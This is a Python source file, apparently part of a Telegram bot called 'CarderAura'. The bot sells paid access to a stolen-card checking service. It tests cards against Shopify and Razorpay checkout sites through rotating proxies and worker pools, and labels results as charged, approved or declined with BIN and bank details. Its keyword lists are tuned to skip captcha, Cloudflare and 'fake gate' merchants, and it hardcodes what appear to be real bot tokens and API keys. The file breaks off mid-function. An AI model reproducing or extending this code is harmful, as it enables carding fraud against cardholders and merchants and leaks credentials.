from telethon.errors import FloodWaitError
from telethon import TelegramClient, events, Button
from telethon.tl.types import (
    MessageEntityCustomEmoji,
    ChannelParticipantBanned,
    KeyboardButtonCallback,
    KeyboardButtonUrl,
    KeyboardButtonStyle,
)
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.extensions import html as thtml
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import string
import logging
import socket
import platform
from datetime import datetime, timedelta, timezone
from urllib.parse import urlparse, quote
from typing import Optional, List
from telethon.errors import (
    UserNotParticipantError,
    ChatAdminRequiredError,
    ChannelPrivateError,
)

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

from database import (
    init_db, db,
    ensure_user, get_user_plan, set_user_plan, is_premium_user,
    is_banned_user,
    add_proxy_db, get_all_user_proxies, get_proxy_count, get_random_proxy,
    remove_proxy_by_index, remove_proxy_by_url, clear_all_proxies,
    add_site_db, get_user_sites, remove_site_db,
    save_card_to_db, get_total_cards_count, get_charged_count, get_approved_count,
    get_all_premium_users, get_total_users, get_premium_count,
    get_total_sites_count, get_users_with_sites, get_sites_per_user, get_all_sites_detail,
    mark_user_joined, is_user_marked_joined, remove_joined_mark,
    ban_user, unban_user, get_user_limit, set_user_limit,
    add_global_site, get_global_sites, remove_global_site,
    create_redeem_key, redeem_key
)

# ====================== LOGGING ======================
log = logging.getLogger("CarderAura")
log.setLevel(logging.INFO)
_log_fmt = logging.Formatter('[%(asctime)s] [%(levelname)s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
_ch = logging.StreamHandler()
_ch.setLevel(logging.INFO)
_ch.setFormatter(_log_fmt)
log.addHandler(_ch)
try:
    _fh = logging.FileHandler('CarderAura.log', encoding='utf-8')
    _fh.setLevel(logging.INFO)
    _fh.setFormatter(_log_fmt)
    log.addHandler(_fh)
except:
    pass

def log_user(uid, action, msg, level="info"):
    getattr(log, level, log.info)(f"[USER:{uid}] [{action}] {msg}")

def log_system(action, msg, level="info"):
    getattr(log, level, log.info)(f"[SYSTEM] [{action}] {msg}")

# ====================== BOLD SANS CONVERTER ======================
_BOLD_SANS_MAP = {}
_normal_upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
_normal_lower = "abcdefghijklmnopqrstuvwxyz"
_normal_digits = "0123456789"
_bold_upper = "𝗔𝗕𝗖𝗗𝗘𝗙𝗚𝗛𝗜𝗝𝗞𝗟𝗠𝗡𝗢𝗣𝗤𝗥𝗦𝗧𝗨𝗩𝗪𝗫𝗬𝗭"
_bold_lower = "𝗮𝗯𝗰𝗱𝗲𝗳𝗴𝗵𝗶𝗷𝗸𝗹𝗺𝗻𝗼𝗽𝗾𝗿𝘀𝘁𝘂𝘃𝘄𝘅𝘆𝘇"
_bold_digits = "𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵"

for _i, _c in enumerate(_normal_upper):
    _BOLD_SANS_MAP[_c] = _bold_upper[_i]
for _i, _c in enumerate(_normal_lower):
    _BOLD_SANS_MAP[_c] = _bold_lower[_i]
for _i, _c in enumerate(_normal_digits):
    _BOLD_SANS_MAP[_c] = _bold_digits[_i]

def bs(text):
    if not text:
        return text
    return "".join(_BOLD_SANS_MAP.get(c, c) for c in str(text))

# ====================== CONFIG ======================
API_ID = int(os.getenv("API_ID", "35458756"))
API_HASH = os.getenv("API_HASH", "eac538ffbeb1c5a039a9a9e6ff293149")
BOT_TOKEN = os.getenv("BOT_TOKEN", "8904193178:AAHvUD_P0XZ6N807ijNQW_15krn76p4Ty14")
ADMIN_ID = json.loads(os.getenv("ADMIN_ID", "[7579324057, 5782447962]"))
OWNER_USERNAME = "@Sqiziii"
HIT_CHANNEL_ID = int(os.getenv("HIT_CHANNEL_ID", "-1004402500203"))
JOIN_GROUP_ID = int(os.getenv("JOIN_GROUP_ID", "-1003914972510"))
JOIN_CHANNEL_ID = int(os.getenv("JOIN_CHANNEL_ID", "-1003914972510"))
JOIN_GROUP_LINK = os.getenv("JOIN_GROUP_LINK", "https://t.me/xaimhub")
JOIN_CHANNEL_LINK = os.getenv("JOIN_CHANNEL_LINK", "https://t.me/xaimhub")
FORCE_JOIN_IMAGES = [
    "https://i.ibb.co/m5Ky5QYZ/IMG-20260828-110903-164.jpg",
    "https://i.ibb.co/m5Ky5QYZ/IMG-20260828-110903-164.jpg"
]
API_BASE_URL = os.getenv("API_BASE_URL", "http://5.175.222.144:8081")
env_api_url = os.getenv("RAZORPAY_API_URL")
if env_api_url:
    RAZORPAY_API_URLS = [url.strip() for url in env_api_url.split(",") if url.strip()]
else:
    RAZORPAY_API_URLS = [
        "https://rzbot-production-bc21.up.railway.app/check",
        "https://rzbot-production-681e.up.railway.app/check",
        "https://rzbot-production-099c.up.railway.app/check",
    ]

RAZORPAY_API_URLS = [
    (u.rstrip("/") + "/check" if not u.endswith("/check") and not u.endswith("/check/") else u)
    for u in RAZORPAY_API_URLS
]

_rz_api_index = 0
def get_next_razorpay_api_url():
    global _rz_api_index
    if not RAZORPAY_API_URLS:
        return "https://rzbot-production-bc21.up.railway.app/check"
    url = RAZORPAY_API_URLS[_rz_api_index]
    _rz_api_index = (_rz_api_index + 1) % len(RAZORPAY_API_URLS)
    return url
RAZORPAY_AMOUNT = 1000
RAZORPAY_SITES_FILE = "razorpay_sites.txt"

def load_razorpay_sites():
    default_sites = ["https://razorpay.me/@ayurgamaya", "https://razorpay.me/@tpstech"]
    if not os.path.exists(RAZORPAY_SITES_FILE):
        return default_sites
    try:
        with open(RAZORPAY_SITES_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            sites = [line.strip() for line in f if line.strip()]
        return sites if sites else default_sites
    except:
        return default_sites

def normalize_rz_site_url(url):
    url = url.strip().lower()
    url = re.sub(r'^https?://', '', url)
    url = url.rstrip('/')
    if url.startswith('www.'):
        url = url[4:]
    return url

def extract_rz_urls_from_text(text):
    tokens = re.split(r'[\s,]+', text)
    result = []
    seen = set()
    for token in tokens:
        token = token.strip()
        if not token: continue
        if '.' not in token: continue
        token = token.strip('[]()<>{}*`"\'')
        if not token: continue
        
        full_url = token
        if not full_url.startswith(('http://', 'https://')):
            full_url = 'https://' + full_url
            
        norm = normalize_rz_site_url(full_url)
        if norm and norm not in seen:
            seen.add(norm)
            result.append(full_url)
    return result

async def get_mrz_speed() -> str:
    try:
        doc = await db["settings"].find_one({"key": "mrz_speed"})
        return doc.get("speed", "original") if doc else "original"
    except:
        return "original"

async def set_mrz_speed(speed: str):
    try:
        await db["settings"].update_one(
            {"key": "mrz_speed"},
            {"$set": {"speed": speed, "updated_at": datetime.utcnow()}},
            upsert=True
        )
    except:
        pass

async def get_user_sp_limit(plan: str, uid: int) -> int:
    try:
        user = await db["users"].find_one({"user_id": uid})
        if user and "custom_sp_limit" in user:
            return user["custom_sp_limit"]
        if user and "custom_limit" in user:
            return user["custom_limit"]
    except:
        pass
    return await get_cc_limit(plan, uid)

async def set_user_sp_limit(uid: int, limit: int):
    if limit < 0 or limit > 999999:
        return False
    await db["users"].update_one(
        {"user_id": uid},
        {"$set": {"custom_sp_limit": limit, "updated_at": datetime.utcnow()}},
        upsert=True
    )
    return True

async def get_user_mrz_limit(plan: str, uid: int) -> int:
    try:
        user = await db["users"].find_one({"user_id": uid})
        if user and "custom_mrz_limit" in user:
            return user["custom_mrz_limit"]
        if user and "custom_limit" in user:
            return user["custom_limit"]
    except:
        pass
    return await get_cc_limit(plan, uid)

async def set_user_mrz_limit(uid: int, limit: int):
    if limit < 0 or limit > 999999:
        return False
    await db["users"].update_one(
        {"user_id": uid},
        {"$set": {"custom_mrz_limit": limit, "updated_at": datetime.utcnow()}},
        upsert=True
    )
    return True

async def set_owner_username(username: str):
    try:
        username = username.strip().replace("@", "")
        await db["settings"].update_one(
            {"key": "owner_username"},
            {"$set": {"username": username, "updated_at": datetime.now(timezone.utc)}},
            upsert=True
        )
    except:
        pass

async def get_active_rz_site() -> str:
    try:
        doc = await db["settings"].find_one({"key": "active_rz_site"})
        return doc.get("site") if doc else None
    except:
        return None

async def set_active_rz_site(site: str):
    try:
        if site:
            await db["settings"].update_one(
                {"key": "active_rz_site"},
                {"$set": {"site": site, "updated_at": datetime.utcnow()}},
                upsert=True
            )
        else:
            await db["settings"].delete_one({"key": "active_rz_site"})
    except:
        pass

async def get_razorpay_amount() -> int:
    try:
        doc = await db["settings"].find_one({"key": "razorpay_amount"})
        return doc.get("amount", 1000) if doc else 1000
    except:
        return 1000

async def set_razorpay_amount(amount: int):
    try:
        await db["settings"].update_one(
            {"key": "razorpay_amount"},
            {"$set": {"amount": amount, "updated_at": datetime.utcnow()}},
            upsert=True
        )
    except:
        pass

BOT_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

# ── SEPARATE Worker Configuration (PER-USER) ──
SP_PER_USER_WORKERS = 30
MSP_PER_USER_WORKERS = 70
RZ_PER_USER_WORKERS = 30
MRZ_PER_USER_WORKERS = 50
SITE_PER_USER_WORKERS = 30
PROXY_PER_USER_WORKERS = 50
BIN_WORKERS = 20

# ── Timeout Configuration ──
API_TIMEOUT = 60
BIN_TIMEOUT = 60
PROXY_TIMEOUT = 12
RZ_TIMEOUT = 60

# ── General Settings ──
BATCH_SIZE = 60
SITE_CHECK_BATCH = 40
HIT_DELAY = 1.5
PER_USER_LIMIT = 200
LOG_CHANNEL_ID = HIT_CHANNEL_ID

FREE_SP_DAILY_LIMIT = 15
FREE_SP_COOLDOWN = 10

PLANS = {
    "plan1": {"name": bs("Core Access"), "tier": "Core", "duration_days": 7, "emoji": "🛠️", "price": "$8.00"},
    "plan2": {"name": bs("Elite Access"), "tier": "Elite", "duration_days": 15, "emoji": "👑", "price": "$14.00"},
    "plan3": {"name": bs("Root Access"), "tier": "Root", "duration_days": 30, "emoji": "⭐", "price": "$25.00"},
    "plan4": {"name": bs("X-Access"), "tier": "X", "duration_days": 90, "emoji": "💎", "price": "$60.00"},
}
PAID_TIERS = ["Core", "Elite", "Root", "X"]

# ── PER-USER Semaphore Factory (FULLY SEPARATED per function) ──
_USER_SEMS = {}
_BIN_SEM = asyncio.Semaphore(BIN_WORKERS)

def get_user_sem(uid, sem_type="msp"):
    key = f"{uid}_{sem_type}"
    if key not in _USER_SEMS:
        limits = {
            "sp": SP_PER_USER_WORKERS,
            "msp": MSP_PER_USER_WORKERS,
            "rz": RZ_PER_USER_WORKERS,
            "mrz": MRZ_PER_USER_WORKERS,
            "site": SITE_PER_USER_WORKERS,
            "proxy": PROXY_PER_USER_WORKERS,
        }
        _USER_SEMS[key] = asyncio.Semaphore(limits.get(sem_type, 30))
    return _USER_SEMS[key]

def cleanup_user_sem(uid):
    keys_to_remove = [k for k in _USER_SEMS if k.startswith(f"{uid}_")]
    for k in keys_to_remove:
        del _USER_SEMS[k]

CE = {
    "crown": 5039727497143387500, "bolt": 5042334757040423886,
    "brain": 5040030395416969985, "shield": 5042328396193864923,
    "star": 5042176294222037888, "gem": 5042050649248760772,
    "check": 5039793437776282663, "fire": 5039644681583985437,
    "party": 5039778134807806727, "search": 5039649904264217620,
    "chart": 5042290883949495533, "pin": 5039600026809009149,
    "joker": 5039998939076494446, "plus": 5039891861246838069,
    "cross": 5040042498634810056, "info": 5042306247047513767,
    "gift": 5041975203853239332, "eyes": 5039623284056917259,
    "trash": 5039614900280754969, "tick": 5039844895779455925,
    "stop": 5039671744172917707, "warn": 5039665997506675838,
    "link": 5042101437237036298, "globe": 5042186567783809934,
    "restart": 5413554170668032766, "online": 5413813953685923984,
    "declined": 4956612582816351459,
}
PE = "⭐"

ACTIVE_SESSIONS = {}
ACTIVE_MTXT_PROCESSES = {}
ACTIVE_MRZ_PROCESSES = {}
ACTIVE_ADD_PROCESSES = {}
PENDING_ADD_SITES = {}
PENDING_SITE_CHECK = {}
PENDING_ADD_GLOBAL_SITES = {}
ACTIVE_ADD_GLOBAL_PROCESSES = {}
PENDING_SITEG_CHECK = {}
USER_APPROVED_PREF = {}
PENDING_RETRY_ERRORS = {}
MAINTENANCE_FILE = "maintenance.json"
_MAINTENANCE_CACHE = {"enabled": None, "last_check": 0}
_JOIN_CACHE = {}
_FREE_SP_USAGE = {}
_FREE_SP_LAST_USE = {}

BOT_START_TIME = time.time()

HIT_BUTTON = [[Button.url(bs("PRIME CHK"), "https://t.me/+iqPWIHUwsXw4Y2Jl")]]

# ── SEPARATE PER-USER HTTP Session Pools ──
_USER_HTTP_SESSIONS = {}
_GLOBAL_BIN_SESSION = None
_GLOBAL_PROXY_SESSION = None

async def get_user_http_session(uid, purpose="general"):
    key = f"{uid}_{purpose}"
    session = _USER_HTTP_SESSIONS.get(key)
    if session is None or session.closed:
        timeout_val = RZ_TIMEOUT if purpose in ("rz", "mrz") else API_TIMEOUT
        connector = aiohttp.TCPConnector(
            limit=150,
            limit_per_host=50,
            ttl_dns_cache=300,
            use_dns_cache=True,
            keepalive_timeout=30,
            enable_cleanup_closed=True,
        )
        session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=timeout_val, connect=10),
            connector=connector,
        )
        _USER_HTTP_SESSIONS[key] = session
    return session

async def cleanup_user_http_session(uid, purpose="general"):
    key = f"{uid}_{purpose}"
    session = _USER_HTTP_SESSIONS.pop(key, None)
    if session and not session.closed:
        try:
            await session.close()
        except:
            pass

async def get_bin_session():
    global _GLOBAL_BIN_SESSION
    if _GLOBAL_BIN_SESSION is None or _GLOBAL_BIN_SESSION.closed:
        _GLOBAL_BIN_SESSION = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=BIN_TIMEOUT, connect=5),
            connector=aiohttp.TCPConnector(limit=50, limit_per_host=20, ttl_dns_cache=300, use_dns_cache=True)
        )
    return _GLOBAL_BIN_SESSION

async def get_proxy_session():
    global _GLOBAL_PROXY_SESSION
    if _GLOBAL_PROXY_SESSION is None or _GLOBAL_PROXY_SESSION.closed:
        _GLOBAL_PROXY_SESSION = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT, connect=15),
            connector=aiohttp.TCPConnector(limit=30, limit_per_host=10, ttl_dns_cache=300, use_dns_cache=True)
        )
    return _GLOBAL_PROXY_SESSION

# ====================== FREE USER DAILY TRACKER ======================
def _get_today_key():
    return datetime.now().strftime("%Y-%m-%d")

def get_free_sp_usage(user_id):
    today = _get_today_key()
    entry = _FREE_SP_USAGE.get(user_id)
    if not entry or entry.get("date") != today:
        _FREE_SP_USAGE[user_id] = {"date": today, "count": 0}
        return 0
    return entry["count"]

def increment_free_sp_usage(user_id):
    today = _get_today_key()
    entry = _FREE_SP_USAGE.get(user_id)
    if not entry or entry.get("date") != today:
        _FREE_SP_USAGE[user_id] = {"date": today, "count": 1}
    else:
        _FREE_SP_USAGE[user_id]["count"] += 1

def get_free_sp_cooldown_remaining(user_id):
    last = _FREE_SP_LAST_USE.get(user_id, 0)
    elapsed = time.time() - last
    if elapsed >= FREE_SP_COOLDOWN:
        return 0
    return round(FREE_SP_COOLDOWN - elapsed, 1)

def set_free_sp_last_use(user_id):
    _FREE_SP_LAST_USE[user_id] = time.time()

# ====================== SMART ROTATION ENGINE ======================
class SmartRotator:
    def __init__(self):
        self._site_fails = {}
        self._proxy_fails = {}
        self._site_idx = 0
        self._proxy_idx = 0

    def pick_site(self, sites, exclude=None):
        if not sites:
            return None
        exclude = exclude or set()
        available = [s for s in sites if s not in exclude and self._site_fails.get(s, 0) < 5]
        if not available:
            available = [s for s in sites if s not in exclude]
        if not available:
            available = list(sites)
        self._site_idx = (self._site_idx + 1) % len(available)
        return available[self._site_idx]

    def pick_proxy(self, proxies, exclude=None):
        if not proxies:
            return None
        exclude = exclude or set()
        available = [p for p in proxies if p.get('proxy_url') not in exclude and self._proxy_fails.get(p.get('proxy_url'), 0) < 5]
        if not available:
            available = [p for p in proxies if p.get('proxy_url') not in exclude]
        if not available:
            available = list(proxies)
        self._proxy_idx = (self._proxy_idx + 1) % len(available)
        return available[self._proxy_idx]

    def report_site_ok(self, site):
        self._site_fails[site] = 0

    def report_site_fail(self, site):
        self._site_fails[site] = self._site_fails.get(site, 0) + 1

    def report_proxy_ok(self, proxy_url):
        if proxy_url:
            self._proxy_fails[proxy_url] = 0

    def report_proxy_fail(self, proxy_url):
        if proxy_url:
            self._proxy_fails[proxy_url] = self._proxy_fails.get(proxy_url, 0) + 1

    def get_site_fails(self, site):
        return self._site_fails.get(site, 0)

    def get_dead_sites(self, threshold=5):
        return {s for s, c in self._site_fails.items() if c >= threshold}

# ====================== SITE ERROR DETECTION ======================
SITE_ERROR_KEYWORDS = [
    'r4 token empty', 'payment method is not shopify', 'r2 id empty', 'product id is empty',
    'py id empty', 'clinte token', 'receipt_empty', 'receipt id is empty', 'receipt empty',
    'site requires login', 'failed to get token', 'no valid products', 'not shopify',
    'failed to get checkout', 'failed to detect product', 'failed to create checkout',
    'failed to get proposal data', 'site not supported', 'site error! status: 429',
    'token not found', 'handle is empty', 'payment method identifier is empty',
    'failed to get session token', 'failed to tokenize card', 'no_session_token',
    'no session token', 'no checkout token found',
    'checkout token not found', 'no checkout token', 'checkout token is empty',
    'tokenize_fail', 'tokenize fail', 'tax ammount empty', 'tax amount empty',
    'tax amount is empty', 'del ammount empty', 'site not supported for now',
    'payment base card not supported', 'no product found', 'checkout is not available',
    'cart is empty', 'cart add failed after retries', 'checkout_expired',
    'checkout_not_found', 'no shipping methods available', 'site error', 'site dead',
    'site errors', 'server error', 'internal server error',
    'internal_server_error', 'application error', 'unexpected error',
    'something went wrong', 'error in 1st req', 'error in 1 req',
    'error processing card', 'we could not process', 'unable to process',
    'payment provider error', 'payment gateway error', 'session expired',
    'session invalid', 'failed after retries', 'max retries exceeded',
    'all sites dead', 'all sites unavailable', 'processinf error', 'handle error',
    'nonetype', "nonetype' object has no attribute 'get", 'unknown error',
    'unknown_error', 'unknown_result', 'utm_source', 'shop is unavailable',
    'store is unavailable', 'store not found', 'page not found',
    'this store is unavailable', 'this shop is currently unavailable',
    'password protected', 'enter store using password', 'storefront is password protected',
    'shop closed', 'store closed', 'delivery_delivery_line_detail_changed',
    'delivery_address2_required', 'delivery_line_detail_changed', 'delivery_line',
    'delivery_address', 'address_required', 'submit_rejected',
    'submit rejected:', 'change proxy or site', 'change site',
    'fake charge gate', 'fake gate',
    'hcaptcha detected', 'hcaptcha_detected', 'captcha at checkout',
    'captcha_required', 'captcha required', 'cloudflare',
    'access denied', 'permission denied',
    'connection error', 'connection failed', 'timed out', 'timeout',
    'could not resolve host', 'connect tunnel failed', 'unreachable',
    'network error', 'connection reset', 'empty reply from server',
    'tlsv1 alert', 'ssl routines', 'openssl ssl_connect', 'api_timeout',
    'http error', 'httperror504', '502', '503', '504',
    'bad gateway', 'service unavailable', 'gateway timeout',
    'site error! status: 404', 'site error! status: 401',
    'amount_too_small', 'amount too small', 'merchandise_not_enough_stock',
    'product out of stock', 'malformed input', 'url rejected',
    'invalid_response',
    'cart failed with status', 'invalid json response', 'invalid json',
    'inventoryreservationfailure', 'inventory_reservation_failure',
    'payments_positive_amount_expec', 'payments_payment_flexibility_t',
    'payments_credit_card_brand_not', 'buyer_identity_presentment_currency',
    "'products'", "error:", "error: '",
    'unable to get payment token',
    'empty submit response',
    'empty submit',
    'order_total_changed',
    'order total changed',
    'invalid_payment_method',
    'invalid payment method',
    'validation_custom',
    'validation custom',
    'ARTIFACT_DISSATISFACTION',
    'artifact_dissatisfaction',
    'TAX_NEW_TAX_MUST_BE_ACCEPTED',
    'tax_new_tax_must_be_accepted',
    'PROCESSING_ERROR',
    'processing_error',
    'DELIVERY_COMPANY_REQUIRED',
    'delivery_company_required',
    'DECISION_RULE_BLOCK',
    'decision_rule_block',
    'timeout'
]

PROXY_ERROR_KEYWORDS = [
    'proxy dead', 'proxy error', 'proxy timeout',
    'proxy connection failed', 'proxy refused',
]

RZ_RETRY_KEYWORDS = [
    'payment id not found', 'payment_id_not_found',
    'timeout', 'timed out', 'connection error',
    'connection failed', 'connection reset',
    'server error', 'internal server error',
    '502', '503', '504', 'bad gateway',
    'service unavailable', 'gateway timeout',
    'empty reply', 'invalid json',
    'could not resolve host', 'network error',
    'ssl routines', 'unreachable',
    'proxy dead', 'proxy error', 'proxy timeout',
    'DEAD | Payment ID not found', 'timeout',
]

def is_site_error(text):
    if not text:
        return True
    lower = text.lower().strip()
    if lower == 'na':
        return True
    return any(kw in lower for kw in SITE_ERROR_KEYWORDS)

def is_proxy_error(text):
    if not text:
        return False
    return any(kw in text.lower().strip() for kw in PROXY_ERROR_KEYWORDS)

def is_rz_retry_error(text):
    if not text:
        return True
    lower = text.lower().strip()
    return any(kw in lower for kw in RZ_RETRY_KEYWORDS)

def is_truly_alive(response, price):
    if not response:
        return False
    lower = response.lower().strip()
    pc = str(price).replace('$', '').strip() if price else '0'
    try:
        pv = float(pc)
    except:
        pv = 0.0
    bad = ['error:', 'error: ', "error: '", 'cart failed', 'invalid json',
           'inventoryreservationfailure', 'payments_positive_amount',
           'payments_payment_flexibility', 'payments_credit_card_brand']
    for b in bad:
        if b in lower:
            return False
    if pv == 0.0:
        normal = ['card_declined', 'card declined', 'generic_decline', 'generic decline',
                   'do_not_honor', 'do not honor', 'insufficient_funds', 'insufficient funds',
                   'stolen_card', 'lost_card', 'expired_card', 'expired card',
                   'otp_required', 'otp required', '3d', 'authentication',
                   'cvc', 'ccn', 'generic_error', 'generic error',
                   'restricted_card', 'fraudulent', 'not_permitted',
                   'transaction_not_allowed', 'card_not_supported']
        if not any(n in lower for n in normal):
            return False
    return True

# ====================== URL NORMALIZATION ======================
def normalize_site_url(url):
    url = url.strip().lower()
    url = re.sub(r'^https?://', '', url)
    url = url.rstrip('/')
    if url.startswith('www.'):
        url = url[4:]
    if '/' in url:
        url = url.split('/')[0]
    return url

# ====================== MESSAGE SYSTEM ======================
client_instance = None

def build_entities(html_text, emoji_ids=None):
    text, entities = thtml.parse(html_text)
    if emoji_ids:
        idx, utf16_pos = 0, 0
        for ch in text:
            if ch == PE and idx < len(emoji_ids):
                entities.append(MessageEntityCustomEmoji(offset=utf16_pos, length=1, document_id=emoji_ids[idx]))
                idx += 1
            utf16_pos += 2 if ord(ch) > 0xFFFF else 1
    return text, sorted(entities, key=lambda e: e.offset)

async def styled_reply(event, html_text, buttons=None, emoji_ids=None, file=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        return await asyncio.wait_for(
            event.reply(text, formatting_entities=entities, buttons=buttons, file=file, link_preview=False),
            timeout=15
        )
    except asyncio.TimeoutError:
        return None
    except:
        try:
            return await asyncio.wait_for(
                event.reply(html_text[:4000], parse_mode='html', link_preview=False),
                timeout=10
            )
        except:
            return None

async def styled_send(chat_id, html_text, buttons=None, emoji_ids=None, file=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        return await asyncio.wait_for(
            client_instance.send_message(chat_id, text, formatting_entities=entities, buttons=buttons, file=file, link_preview=False),
            timeout=15
        )
    except:
        return None

async def styled_edit(msg, html_text, buttons=None, emoji_ids=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        await asyncio.wait_for(
            msg.edit(text, formatting_entities=entities, buttons=buttons, link_preview=False),
            timeout=8
        )
    except:
        pass

def pbtn(text, data=None, url=None, bg_primary=None, bg_danger=None, bg_success=None, icon=None):
    style = None
    if bg_primary or bg_danger or bg_success or icon:
        style = KeyboardButtonStyle(
            bg_primary=bg_primary,
            bg_danger=bg_danger,
            bg_success=bg_success,
            icon=icon
        )
    if url:
        if style:
            return KeyboardButtonUrl(text, url, style=style)
        return Button.url(text, url)
    d = data.encode() if isinstance(data, str) else (data or b"none")
    if style:
        return KeyboardButtonCallback(text, d, style=style)
    return Button.inline(text, d)

# ====================== CARD FORMATTING ======================
def format_card_result(status, card, gateway, response, price="-", site="-", bin_info=None, elapsed=0.0):
    sm = {
        "Charged": (f"<b>{bs('CHARGED')}</b> {PE}", [CE["fire"]]),
        "Approved": (f"<b>{bs('APPROVED')}</b> {PE}", [CE["check"]]),
        "Declined": (f"<b>{bs('DECLINED')}</b> {PE}", [CE["declined"]]),
        "Error": (f"<b>{bs('ERROR')}</b> {PE}", [CE["cross"]])
    }
    h, he = sm.get(status, sm["Declined"])
    bi = bin_info or {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
    ps = f"${str(price).replace('$', '')}" if price and price != "-" else "-"
    return f"""{h}
<b>━━━━━━━━━━━━━━━━━</b>
<a href='https://t.me/{OWNER_USERNAME}'>⊀</a> <b>{bs('Card')}</b>
⤷ <code>{card}</code>
<b>{bs('Gateway')}</b> ━ <code>{gateway}</code>
<b>{bs('Response')}</b> ━ <code>{response}</code>
<b>{bs('Price')}</b> ━ <code>{ps}</code>
<b>━━━━━━━━━━━━━━━━━</b>
<b>{bs('BIN')}:</b> <code>{bi.get('brand', '-')} | {bi.get('type', '-')} | {bi.get('level', '-')}</code>
<b>{bs('Bank')}:</b> <code>{bi.get('bank', '-')}</code>
<b>{bs('Country')}:</b> <code>{bi.get('country', '-')} {bi.get('flag', '🏳️')}</code>

<b>{bs('Took')}</b> ⏱ <code>{elapsed:.2f}{bs('s')}</code>""", he

def format_card_result_no_price(status, card, gateway, response, bin_info=None, price="₹10"):
    sm = {
        "Charged": (f"<b>{bs('CHARGED')}</b> {PE}", [CE["fire"]]),
        "Approved": (f"<b>{bs('APPROVED')}</b> {PE}", [CE["check"]]),
        "Declined": (f"<b>{bs('DECLINED')}</b> {PE}", [CE["declined"]]),
        "Error": (f"<b>{bs('ERROR')}</b> {PE}", [CE["cross"]])
    }
    h, he = sm.get(status, sm["Declined"])
    bi = bin_info or {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
    return f"""{h}
<b>━━━━━━━━━━━━━━━━━</b>
<a href='https://t.me/{OWNER_USERNAME}'>⊀</a> <b>{bs('Card')}</b>
⤷ <code>{card}</code>
<b>{bs('Gateway')}</b> ━ <code>{gateway}</code>
<b>{bs('Response')}</b> ━ <code>{response}</code>
<b>{bs('Price')}</b> ━ <code>{price}</code>
<b>━━━━━━━━━━━━━━━━━</b>
<b>{bs('BIN')}:</b> <code>{bi.get('brand', '-')} | {bi.get('type', '-')} | {bi.get('level', '-')}</code>
<b>{bs('Bank')}:</b> <code>{bi.get('bank', '-')}</code>
<b>{bs('Country')}:</b> <code>{bi.get('country', '-')} {bi.get('flag', '🏳️')}</code>""", he

def format_simple_card_result(status, card, gateway, response, bin_info=None, elapsed=0.0, extra_field=None):
    sm = {
        "Charged": (f"<b>{bs('CHARGED')}</b> {PE}", [CE["fire"]]),
        "Approved": (f"<b>{bs('APPROVED')}</b> {PE}", [CE["check"]]),
        "Declined": (f"<b>{bs('DECLINED')}</b> {PE}", [CE["declined"]]),
        "Error": (f"<b>{bs('ERROR')}</b> {PE}", [CE["cross"]])
    }
    h, he = sm.get(status, sm["Declined"])
    bi = bin_info or {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
    el = f"\n<b>{bs(extra_field[0])}</b> ━ <code>{extra_field[1]}</code>" if extra_field else ""
    return f"""{h}
<b>━━━━━━━━━━━━━━━━━</b>
<a href='https://t.me/{OWNER_USERNAME}'>⊀</a> <b>{bs('Card')}</b>
⤷ <code>{card}</code>
<b>{bs('Gateway')}</b> ━ <code>{gateway}</code>
<b>{bs('Response')}</b> ━ <code>{response}</code>{el}
<b>━━━━━━━━━━━━━━━━━</b>
<b>{bs('BIN')}:</b> <code>{bi.get('brand', '-')} | {bi.get('type', '-')} | {bi.get('level', '-')}</code>
<b>{bs('Bank')}:</b> <code>{bi.get('bank', '-')}</code>
<b>{bs('Country')}:</b> <code>{bi.get('country', '-')} {bi.get('flag', '🏳️')}</code>

<b>{bs('Took')}</b> ⏱ <code>{elapsed:.2f}{bs('s')}</code>""", he

def format_rz_single_result(status, card, gateway, response, bin_info=None, elapsed=0.0, price="₹10"):
    sm = {
        "Charged": (f"<b>{bs('CHARGED')}</b> {PE}", [CE["fire"]]),
        "Approved": (f"<b>{bs('APPROVED')}</b> {PE}", [CE["check"]]),
        "Declined": (f"<b>{bs('DECLINED')}</b> {PE}", [CE["declined"]]),
        "Error": (f"<b>{bs('ERROR')}</b> {PE}", [CE["cross"]])
    }
    h, he = sm.get(status, sm["Declined"])
    bi = bin_info or {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
    return f"""{h}
<b>━━━━━━━━━━━━━━━━━</b>
<a href='https://t.me/{OWNER_USERNAME}'>⊀</a> <b>{bs('Card')}</b>
⤷ <code>{card}</code>
<b>{bs('Gateway')}</b> ━ <code>{gateway}</code>
<b>{bs('Response')}</b> ━ <code>{response}</code>
<b>{bs('Price')}</b> ━ <code>{price}</code>
<b>━━━━━━━━━━━━━━━━━</b>
<b>{bs('BIN')}:</b> <code>{bi.get('brand', '-')} | {bi.get('type', '-')} | {bi.get('level', '-')}</code>
<b>{bs('Bank')}:</b> <code>{bi.get('bank', '-')}</code>
<b>{bs('Country')}:</b> <code>{bi.get('country', '-')} {bi.get('flag', '🏳️')}</code>

<b>{bs('Took')}</b> ⏱ <code>{elapsed:.2f}{bs('s')}</code>""", he

# ====================== FORCE JOIN ======================
async def is_user_joined(user_id):
    if user_id in ADMIN_ID:
        return True
    now = time.time()
    cached = _JOIN_CACHE.get(user_id)
    if cached and now - cached < 600:
        return True
    for cid in [JOIN_GROUP_ID, JOIN_CHANNEL_ID]:
        try:
            r = await client_instance(GetParticipantRequest(channel=cid, participant=user_id))
            if isinstance(r.participant, ChannelParticipantBanned):
                return False
        except UserNotParticipantError:
            return False
        except (ChatAdminRequiredError, ChannelPrivateError):
            pass
        except:
            pass
